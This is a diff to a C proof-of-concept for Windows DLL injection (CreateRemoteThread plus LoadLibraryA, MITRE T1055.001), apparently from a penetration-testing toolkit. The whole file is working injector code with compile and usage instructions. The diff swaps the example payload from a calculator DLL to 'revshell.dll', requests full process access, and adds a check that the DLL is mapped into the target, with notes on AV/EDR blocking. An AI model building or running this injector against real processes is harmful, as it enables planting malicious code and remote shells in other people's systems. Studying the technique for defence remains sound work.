@@ -1,10 +1,13 @@
 /*
- * DLL Injection — LoadLibrary via CreateRemoteThread
- *
- * Technique: Write DLL path into target process, call LoadLibraryA
- *            in a remote thread to load the DLL.
+ * DLL Injection — CreateRemoteThread + LoadLibraryA
  *
  * MITRE ATT&CK: T1055.001 — Dynamic-link Library Injection
+ *
+ * Chain:
+ *   OpenProcess -> VirtualAllocEx(RW) -> WriteProcessMemory("C:\\...\\x.dll")
+ *   -> CreateRemoteThread(entry = LoadLibraryA, arg = buf)
+ *
+ * The target's own kernel32 does the load when the thread fires.
  *
  * Compile:
  *   x86_64-w64-mingw32-gcc -o dll_inject.exe dll_injection.c
@@ -12,19 +15,42 @@
  *
  * Usage:
  *   dll_inject.exe <PID> <full_path_to_dll>
- *   dll_inject.exe 1234 C:\payloads\calc.dll
  */
 
 #include <windows.h>
+#include <psapi.h>
 #include <stdio.h>
 #include <string.h>
 
+#pragma comment(lib, "psapi.lib")
+
+/* After CreateRemoteThread -> LoadLibraryA completes, verify the DLL
+ * is actually mapped by walking the target's module list. We can't
+ * rely on GetExitCodeThread: it returns DWORD (32-bit) but HMODULE
+ * is 64-bit on x64 -> the "base" is truncated and may show as 0
+ * even on success. */
+static BOOL verify_dll_loaded(HANDLE hProc, const char* dllName) {
+    HMODULE mods[1024];
+    DWORD needed = 0;
+    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
+        return FALSE;
+    }
+    char nameBuf[MAX_PATH];
+    DWORD count = needed / sizeof(HMODULE);
+    for (DWORD i = 0; i < count; ++i) {
+        if (GetModuleBaseNameA(hProc, mods[i], nameBuf, sizeof(nameBuf)) > 0) {
+            if (_stricmp(nameBuf, dllName) == 0) return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+
 int main(int argc, char* argv[]) {
     if (argc < 3) {
-        printf("DLL Injection — VAPT PoC\n");
-        printf("Usage: %s <PID> <DLL_PATH>\n\n", argv[0]);
-        printf("Example:\n");
-        printf("  %s 1234 C:\\payloads\\calc-pop\\calc.dll\n", argv[0]);
+        printf("DLL Injection PoC\n");
+        printf("Usage: %s <PID> <absolute DLL path>\n", argv[0]);
+        printf("  %s 1234 C:\\payloads\\revshell.dll\n", argv[0]);
         return 1;
     }
 
@@ -32,88 +58,65 @@ int main(int argc, char* argv[]) {
     char* dllPath = argv[2];
     size_t dllPathLen = strlen(dllPath) + 1;
 
-    // Verify DLL exists
     if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
         printf("[-] DLL not found: %s\n", dllPath);
         return 1;
     }
 
-    printf("[*] DLL Injection PoC\n");
-    printf("[*] Target PID: %lu\n", pid);
-    printf("[*] DLL Path: %s\n", dllPath);
+    const char* dllName = strrchr(dllPath, '\\');
+    dllName = dllName ? dllName + 1 : dllPath;
 
-    // Step 1: Open target process
-    HANDLE hProcess = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
-        FALSE, pid);
+    printf("[*] Target PID : %lu\n", pid);
+    printf("[*] DLL        : %s\n", dllPath);
 
-    if (!hProcess) {
-        printf("[-] OpenProcess failed (error %lu)\n", GetLastError());
-        return 1;
-    }
-    printf("[+] Process opened\n");
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 1; }
 
-    // Step 2: Allocate memory for DLL path
-    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen,
+    LPVOID buf = VirtualAllocEx(hProc, NULL, dllPathLen,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) { printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError()); CloseHandle(hProc); return 1; }
 
-    if (!remoteDllPath) {
-        printf("[-] VirtualAllocEx failed (error %lu)\n", GetLastError());
-        CloseHandle(hProcess);
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, buf, dllPath, dllPathLen, &written)) {
+        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return 1;
     }
-    printf("[+] Allocated %zu bytes at 0x%p\n", dllPathLen, remoteDllPath);
+    printf("[+] Wrote DLL path to %p (%zu bytes)\n", buf, written);
 
-    // Step 3: Write DLL path
-    SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath, dllPathLen, &bytesWritten)) {
-        printf("[-] WriteProcessMemory failed (error %lu)\n", GetLastError());
-        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    FARPROC loadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    if (!loadLibraryA) {
+        printf("[-] GetProcAddress(LoadLibraryA) failed\n");
+        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return 1;
     }
-    printf("[+] DLL path written (%zu bytes)\n", bytesWritten);
 
-    // Step 4: Get LoadLibraryA address
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
-
-    if (!pLoadLibrary) {
-        printf("[-] Could not resolve LoadLibraryA\n");
-        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)loadLibraryA, buf, 0, NULL);
+    if (!hT) {
+        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return 1;
     }
-    printf("[+] LoadLibraryA @ 0x%p\n", (void*)pLoadLibrary);
+    printf("[+] Remote thread fired\n");
 
-    // Step 5: Create remote thread calling LoadLibraryA
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)pLoadLibrary, remoteDllPath, 0, NULL);
+    WaitForSingleObject(hT, 10000);
 
-    if (!hThread) {
-        printf("[-] CreateRemoteThread failed (error %lu)\n", GetLastError());
-        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }
-    printf("[+] Remote thread created, DLL loading...\n");
-
-    WaitForSingleObject(hThread, 10000);
-
-    // Check if DLL loaded
-    DWORD exitCode;
-    GetExitCodeThread(hThread, &exitCode);
-    if (exitCode != 0) {
-        printf("[+] DLL loaded successfully (base 0x%lx)\n", exitCode);
+    /* Can't trust GetExitCodeThread on x64 for HMODULE (truncation).
+     * Walk the target's module list and confirm the DLL name is there. */
+    if (verify_dll_loaded(hProc, dllName)) {
+        printf("[+] DLL loaded: %s is now in the target's module list.\n", dllName);
     } else {
-        printf("[-] DLL may have failed to load (LoadLibrary returned NULL)\n");
+        printf("[-] DLL does NOT appear in target's module list - load failed.\n");
+        printf("    Common reasons: wrong architecture (32 vs 64), missing imports,\n");
+        printf("    AV/EDR blocking LoadLibrary, or DLL path contains unicode chars.\n");
     }
 
-    // Cleanup
-    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
+    VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
+    CloseHandle(hT);
+    CloseHandle(hProc);
     return 0;
 }
